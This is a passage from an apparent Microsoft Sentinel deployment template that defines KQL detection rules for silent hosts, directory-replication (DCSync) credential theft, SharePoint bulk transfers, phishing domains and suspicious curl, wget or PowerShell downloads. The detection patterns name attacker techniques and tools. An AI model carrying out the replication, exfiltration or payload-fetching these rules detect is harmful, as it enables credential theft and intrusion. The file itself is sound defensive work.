extract(@'[1-9]*,([,0]+)$',1,EventCountString)\n| extend DaysMissingString = replace_string(DaysMissingString, ',', '')\n| extend DaysMissing = string_size(DaysMissingString)\n//End Calculate Days Missing\n| extend bv_rule_version = '1.0.4893'\n| extend bv_rule_timestamp = '1708455178.7731283'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4893 bv_rule_timestamp: 1708455178.7731283'\n| project Computer, Threshold, EventCount, anomalies, score, baseline, DaysMissing\n| where DaysMissing != 0\n| extend Threshold_TimeToMonitor = iff(isnotempty(A9070_CONFIGURATION[Computer]), A9070_CONFIGURATION[Computer], Threshold)\n| where DaysMissing != 0\n//Max Numbers of days that a divice will report\n| where DaysMissing between( Threshold_TimeToMonitor .. max_reportable_days)\n//Suppression for previously reported devices\n| parse Computer with Computer2 '.' *\n|extend Computer = coalesce(Computer2, Computer)\n| where Computer !in (RecentAlerts)\n| where Computer in (RecentHeartbeats)\n| where Computer matches regex A9070_EXCLUDED_COMPUTER == false\n| summarize Src=make_set(Computer), Data=make_set(pack(\"Computer\", Computer, 'EventCount', EventCount, 'Threshold', Threshold_TimeToMonitor)), EventCount=count() , Computer_threshold=make_set(pack(\"Computer\", Computer, 'Threshold', Threshold_TimeToMonitor)) by Threshold_TimeToMonitor\n| extend ExtendedDescription = strcat(\n          'Missing Computers: ', EventCount\n          ,'\\nTotal Computers: ', TotalHosts\n          ,'\\nMissing Computers (limited to 20): \\n* ', strcat_array(array_slice(Computer_threshold,0,20), '\\n* '))\n| extend AlertName = iff(array_length(Src) == 1, strcat(Src[0], ' has been missing for ', Threshold_TimeToMonitor, ' days'), strcat(EventCount, ' computers have been missing'))\n|extend bv_start_time = now()\n  , bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Device'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9070'\n  , bv_alarm_severity = 'low'\n  , sourcetype = 'SecurityEvent'\n  , bv_alarm_threshold = strcat('System missing for more than ', Threshold, ' days')\n  , bv_alarm_value = strcat(EventCount, ' systems missing')\n  , bv_severity = 'low'\n  , bv_reporting_dvc = strcat_array(array_slice(Src,0,20), '\\n* ')\n| extend bv_rule_version = '1.0.4893'\n| extend bv_rule_timestamp = '1708455178.7731283'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4893 bv_rule_timestamp: 1708455178.7731283'\n| project-keep Src\n    , Data\n    , ExtendedDescription\n    , AlertName\n    , sourcetype\n    , bv_*",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9070: [Health] SecurityEvents - {{AlertName}}",
            "alertDescriptionFormat": "This rule alerts when computers that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in a configured period of time, which is 2 days by default.\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9070_CONFIGURATION\n\n{{ExtendedDescription}}\n\nCategory: Windows Security\ntag: Health\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "Computer": "Src"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f112e5e5-73b1-4cb6-9eb6-ff7b2b0e796d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f112e5e5-73b1-4cb6-9eb6-ff7b2b0e796d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Non Domain Controller Active Directory Replication",
          "description": "This query detects potential attempts by non-computer accounts (non domain controllers) to retrieve/synchronize an active directory object leveraging directory replication services (DRS).\nA Domain Controller (computer account) would usually be performing these actions in a domain environment. Another detection rule can be created to cover domain controllers accounts doing at rare times.\nA domain user with privileged permissions to use directory replication services is rare.",
          "severity": "High",
          "enabled": true,
          "query": "// Enter a reference list of hostnames for your DC servers\n//let DCServersList = dynamic ([\"DC01.simulandlabs.com\",\"DC02.simulandlabs.com\"]);\nSecurityEvent\n//| where Computer in (DCServersList)\n| where Account != \"DCSS\\\\AzureAdConnect-Servi\" and Account != \"EXTEST\\\\adminjr\" and Account != \"DCSS\\\\adminjnorris2\" //Amayor 6/5/24 \n| where EventID == 4662 and ObjectServer == 'DS'\n| where AccountType != 'Machine'\n| where Properties has '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' //DS-Replication-Get-Changes\n    or Properties has '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' //DS-Replication-Get-Changes-All\n    or Properties has '89e95b76-444d-4c62-991a-0facbeda640c' //DS-Replication-Get-Changes-In-Filtered-Set\n| project TimeGenerated, Account, Activity, Properties, SubjectLogonId, Computer\n| join kind=leftouter\n(\n    SecurityEvent\n    //| where Computer in (DCServersList)\n    | where EventID == 4624 and LogonType == 3\n    | where AccountType != 'Machine'\n    | project TargetLogonId, IpAddress\n)\non $left.SubjectLogonId == $right.TargetLogonId\n| project-reorder TimeGenerated, Computer, Account, IpAddress\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| extend AccountName = tostring(split(Account, \"\\\\\")[0]), AccountNTDomain = tostring(split(Account, \"\\\\\")[1])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b9d2eebc-5dcb-4888-8165-900db44443ab",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/70d16d94-6a70-4a62-8c00-28744f9b30e3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/70d16d94-6a70-4a62-8c00-28744f9b30e3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SharePointFileOperation via previously unseen IPs",
          "description": "Identifies when the volume of documents uploaded to or downloaded from Sharepoint by new IP addresses\nexceeds a threshold (default is 50).",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 50;\nlet szSharePointFileOperation = \"SharePointFileOperation\";\nlet szOperations = dynamic([\"FileDownloaded\", \"FileUploaded\"]);\nlet starttime = 14d;\nlet endtime = 1d;\nlet historicalActivity =\nOfficeActivity\n| where TimeGenerated between(ago(starttime)..ago(endtime))\n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| summarize historicalCount = count() by ClientIP, RecordType, Operation;\nlet recentActivity = OfficeActivity\n| where TimeGenerated > ago(endtime)\n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| summarize min(Start_Time), max(Start_Time), recentCount = count() by ClientIP, RecordType, Operation;\nlet RareIP = recentActivity | join kind= leftanti ( historicalActivity ) on ClientIP, RecordType, Operation\n// More than 50 downloads/uploads from a new IP\n| where recentCount > threshold;\nOfficeActivity \n| where TimeGenerated >= ago(endtime) \n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| join kind= inner (RareIP) on ClientIP, RecordType, Operation\n| where Start_Time between(min_Start_Time .. max_Start_Time)\n| summarize StartTimeUtc = min(min_Start_Time), EndTimeUtc = max(max_Start_Time) by RecordType, Operation, UserType, UserId, ClientIP, OfficeWorkload, Site_Url, OfficeObjectId, UserAgent, IPSeenCount = recentCount\n| where UserId <> 'app@sharepoint' // Added by AGeorge 6/4/25 to reduce noise\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserId, IPCustomEntity = ClientIP, URLCustomEntity = Site_Url\n| order by IPSeenCount desc, ClientIP asc, Operation asc, UserId asc",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1030"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4b11568b-3f5f-4ba1-80c8-7f1dc8390eb7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "URLCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a5cefb5d-035c-4f57-81a2-07306d3ab482')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a5cefb5d-035c-4f57-81a2-07306d3ab482')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AUTO DISABLED Lockbit 3.0 Attack Pattern",
          "description": "The alert rule was disabled due to too many consecutive failures. Reason: A table referenced in the query was not found. Verify that the relevant data source is connected. ",
          "severity": "High",
          "enabled": false,
          "query": "SysmonEvent | where (ImageLoaded endswith @'\\MpClient.dll' and not((Image endswith @'System32\\wbem\\wmiprvse.exe') or (Image contains @'mpcmdrun' and Image contains @'windows' and Image contains @'defender' and Image contains @'programdata' and Image contains @'microsoft') or (Image contains @'Program' and Image contains @'Files' and Image contains @'Windows' and Image contains @'Defender' and Image contains @'mpcmdrun') or (ImageLoaded contains @'Program' and ImageLoaded contains @'Files' and ImageLoaded contains @'Windows' and ImageLoaded contains @'Defender') or (ImageLoaded contains @'ProgramData' and ImageLoaded contains @'Microsoft' and ImageLoaded contains @'platform' and ImageLoaded contains @'Windows' and ImageLoaded contains @'Defender')))\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/358a384d-3d0f-4a6e-bd44-a5125c42f91c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/358a384d-3d0f-4a6e-bd44-a5125c42f91c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS-Custom] Tracking attacker-controlled domains",
          "description": "[DCSS-Custom] Tracking attacker-controlled domains",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 30m;\r\nEmailUrlInfo\r\n| where TimeGenerated >= ago(timeframe)\r\n| where Url matches regex @\"s?\\:\\/\\/(?:www\\.)?t\\.(?:[\\w\\-\\.]+\\/+)+(?:r|redirect)\\/?\\?\"\r\n| where Url matches regex @\"^[a-zA-Z]\\-[a-zA-Z]{2}\\.(xyz|club|shop|online)\"",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Reconnaissance"
          ],
          "techniques": [
            "T1566",
            "T1598"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9221ca89-0de3-4313-a63a-317cbe007812')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9221ca89-0de3-4313-a63a-317cbe007812')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS_CUSTOM] Unauthorized PowerShell Execution",
          "description": "NOTE: This rule needs to be refined by adding allowed processes and substring commands. Read notes withing the KQL for details.  \n\nThis rule detects instances where PowerShell is executed unexpectedly or with suspicious arguments, which could indicate malware execution, credential dumping, or reconnaissance activity. Attackers frequently abuse PowerShell to evade detection and execute malicious scripts.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Amayor 2/3/25 Added domain-based refinement to reduce manual URL updates and improve efficiency.\nlet lookback = 5m;\n// Define Risky File Extensions\nlet RiskyFileExtensions = materialize(externaldata(Extensions: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/RiskyFileExtensionsInUrl.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomRiskyFileExtensions = (_ASIM_GetWatchlistRaw(\"Web_RiskyFileExtensions\") \n    | extend Extensions = tostring(WatchlistItem[\"Extensions\"])\n    | project Extensions\n    | where isnotempty(Extensions));\nlet CombinedRiskyFileExtensions = union RiskyFileExtensions, CustomRiskyFileExtensions;\nlet knownRiskyFileExtensions = toscalar(CombinedRiskyFileExtensions\n    | where isnotempty(Extensions)\n    | summarize make_set(Extensions, 1000));\n// Define Whitelisted Domains\nlet Whitelisted_Domains = materialize(externaldata(WhiteListedDomains: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/WhiteListedDomainsForWebSessionUseCases.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomWhiteListedDomains = (_ASIM_GetWatchlistRaw(\"Web_WhiteListedDomains\") \n    | extend WhiteListedDomains = tostring(WatchlistItem[\"WhiteListedDomains\"])\n    | project WhiteListedDomains\n    | where isnotempty(WhiteListedDomains));\nlet CombinedWhitelisted_Domains = union Whitelisted_Domains, CustomWhiteListedDomains;\nlet knownWhitelisted_Domains = toscalar(CombinedWhitelisted_Domains\n    | where isnotempty(WhiteListedDomains)\n    | summarize make_set(WhiteListedDomains, 1000));\n// ######################  Define Trusted Filenames Below \nlet TrustedFilenames = datatable(Filename: string)\n    [\n    \"am_delta_\",// generating a lot of noise, known patching. - DanneF\n    \"hp-cmsl\", // used for Client Management Script Library of HP (bios drivers etc.) -DanneF\n    \"oc-installer-23.4.2-windows_x64.exe\", // generating hundreds of alerts, regular admin work \n    \"b63f6fb2-903e-4ef9-9c8d-bde0e0e3b284.exe\", // block AG's daily alert\n    \"compositecontent.jar\", // apart of myeclipse 12.24.24 -DF\n    \"communitybrandwidgetloader.app\" //Salesforce extension for widget app\n    \"content.jar\",\n    \"download.eclipse.org\", // myeclipse content\n    \"am_delta_patch_1.425.218.0_6f6036d8003cb1a9a2f9b69792c02b2d74ef4ad9.exe\"\n];\n// ####################  Define Trusted Domains Below\nlet TrustedDomains = datatable(Domain: string)\n    [\n    \"microsoft.com\",\n    \"knowbe4.com\",\n    \"adobe.com\",\n    \"knowbe4.com\",\n    \"oracle.com\",\n    \"oraclecloud.com\",\n    \"aspgov.com\",\n    \"force.com\",// Associated with Salesforce\n    \"namequery.com\",// Associated with Absolute\n    \"miro.com\",\n    \"grammarly.com\",\n    \"eclipse.org\",\n    \"hp.com\"\n];\n// Define Trusted URLs\nlet TrustedUrls = datatable(Url: string)\n    [\n    \"http://downloads.genuitec.com/downloads/packs/eclipse-discovery/v4.16.0/updatesite/content.jar\",\n    \"https://download.eclipse.org/technology/m2e/releases/content.jar\",\n    \"http://testng.org/testng-p2-update-site/compositecontent.jar\",\n    \"http://dl.bintray.com/testng-team/testng-p2-release/content.jar\",\n    \"https://globalapp.sco.ca.gov/prod/applet/exc.jar\",\n    \"https://dmvca.my.salesforce-sites.com/service/c/slalom_schedulerlightningout.app?aura.format=JSON&aura.formatAdapter=LIGHTNING_OUT\"\n];\n// Retrieve Threat Intelligence Indicators\nlet IP_Indicators = ThreatIntelligenceIndicator\n    | where isnotempty(NetworkIP)\n        or isnotempty(NetworkSourceIP)\n        or isnotempty(NetworkDestinationIP)\n    | extend TI_ipEntity = coalesce(NetworkIP, NetworkSourceIP, NetworkDestinationIP)\n    | where ipv4_is_private(TI_ipEntity) == false\n    | where TimeGenerated >= ago(7d) and Active == true\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by TI_ipEntity;\n// Web Session Analysis\n_Im_WebSession(starttime=ago(lookback), url_has_any=knownRiskyFileExtensions, eventresult='Success')\n| where Url !contains \"am_delta_patch\"\n| where Url !contains \"windowsdesktop-runtime\"\n| project\n    Url,\n    SrcIpAddr,\n    TimeGenerated,\n    SrcUsername,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber\n| extend requestedFileName = tostring(split(tostring(parse_url(Url)[\"Path\"]), '/')[-1])\n| extend requestedFileExt = extract(@'(\\.\\w+)$', 1, requestedFileName, typeof(string))\n| where isnotempty(requestedFileExt) // Ensure requestedFileExt is valid\n| where requestedFileExt in~ (knownRiskyFileExtensions)\n| where requestedFileName !in (TrustedFilenames) // Exclude trusted filenames\n| extend FQDN = split(parse_url(Url)[\"Host\"], '.')\n| extend Domain = iif(array_length(FQDN) > 1, strcat(FQDN[-2], '.', FQDN[-1]), FQDN)\n| where not (Url in (TrustedUrls) or Domain in (TrustedDomains)) // Exclude trusted URLs OR trusted domains\n| where Domain !in~ (knownWhitelisted_Domains)\n| project-away FQDN\n| summarize \n    EventCount = count(),\n    EventStartTime = min(TimeGenerated),\n    EventEndTime = max(TimeGenerated)\n    by\n    SrcUsername,\n    SrcIpAddr,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber,\n    Domain,\n    Url,\n    requestedFileName,\n    requestedFileExt\n| join kind=leftouter (\n    IP_Indicators \n    | project TI_ipEntity\n    )\n    on $left.SrcIpAddr == $right.TI_ipEntity\n| extend TIMatch = isnotempty(TI_ipEntity)\n| extend\n    Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 0)[0]), SrcUsername),\n    UPNSuffix = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 1)[0]), \"\")\n| project \n    SrcUsername,\n    Name,\n    UPNSuffix,\n    SrcIpAddr,\n    DstIpAddr,\n    DstPortNumber,\n    Domain,\n    Url,\n    requestedFileName,\n    requestedFileExt, \n    EventCount,\n    EventStartTime,\n    EventEndTime,\n    TIMatch\n\n",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Execution",
            "Persistence"
          ],
          "techniques": [
            "T1059",
            "T1546"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "SrcUsername"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "requestedFileName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11505')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11505')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11505: [SOC] Defender - High Executable Activity and Outbound HTTP Requests",
          "description": "This alert is designed to detect potentially malicious activity on a network by focusing on three key indicators: high volumes of executable file creation and deletion, outbound HTTP requests initiated by the \"curl\", \"wget\" or \"Invoke-WebRequest\" command, and the execution of common unpacking tools. These behaviors may signal malware activities, such as those associated with CoreWarrior, a persistent backdoor targeting Windows systems. First seen on MalwareBazaar in July 2022 and further analyzed by SonicWall in October 2024, CoreWarrior is notable for its rapid self-replication, creating up to 117 copies of itself within 10 minutes. By monitoring these indicators, the rule aims to provide comprehensive insights into unusual or potentially harmful actions on a network. MITRE: T1055,T1082,T1036,T1057,T1083,T1106 Category: DefenderXDR,Microsoft Defender XDR tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-11505';\nlet alert_type = 'SOC';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet end_time = now();\nlet start_time = 10m;\nlet start_time_historical = 47h;\nlet start_time_suppress = 47h;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])\n    , 'RBASCORE': 0\n    , 'excluded_dedup_hash_fields': dynamic(['bv_alert_category', 'bv_parent'])      \n    , 'THRESHOLD': 10    \n    , 'unpackingTools': dynamic([\"7z.exe\", \"winrar.exe\", \"unzip.exe\", \"tar.exe\", \"upx.exe\"])\n    , 'commandLineExclusions': dynamic([@\"c:\\PROGRA~3\\dell\\drivers\", @\"C:\\PROGRA~3\\Dell\\UPDATE~1\\\", @\"C:\\Program Files (x86)\\ManageEngine\\\", @\"C:\\ProgramData\\dell\\\"])\n    , 'remoteURLExclusions': dynamic([\"http://notifier.win-rar.com:443\", \"https://notifier.rarlab.com\"])\n    , 'processNameExclusions': dynamic([\"dellsupportassistremediationserviceinstaller.exe\"])\n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11505_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_dest_user_type','bv_change_action','bv_vendor_product', 'bv_vendor_reason', 'bv_alarm_rba_score']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11505_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet calc_dedup_hash = (table_parameter: (*), excluded_fields:dynamic=dynamic([])){  \n    table_parameter  \n    //| extend excluded_fields = array_concat(bv_excluded_dedup_hash_fields,excluded_fields)   \n    | extend all_data = pack_all(ignore_null = true)  \n    | extend keys = array_sort_asc(bag_keys(all_data))  \n    | mv-apply k = keys to typeof(string) on (    \n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))  \n        | extend \n            is_valid_field = k startswith 'bv_' and not(k has_any (excluded_fields))\n            , is_valid_value = (gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1 and isnotempty(array_sort_desc(dynamic_entity)[0])) or (gettype(dynamic_entity) != 'array' and dynamic_entity != 'array')\n        | extend \n            bv_dedup_fields = iff(is_valid_field and is_valid_value, k, '')  \n            , bv_dedup_values = iff(is_valid_field and is_valid_value, coalesce(tostring(dynamic_entity[0]),dynamic_entity), '') \n        | summarize bv_dedup_fields = make_set_if(tostring(bv_dedup_fields), isnotempty(bv_dedup_fields)), dedup_values = make_set_if(tostring(bv_dedup_values), isnotempty(bv_dedup_values)) \n    )  \n    | extend bv_dedup_hash = hash_sha1(strcat_array(dedup_values,''))  \n};        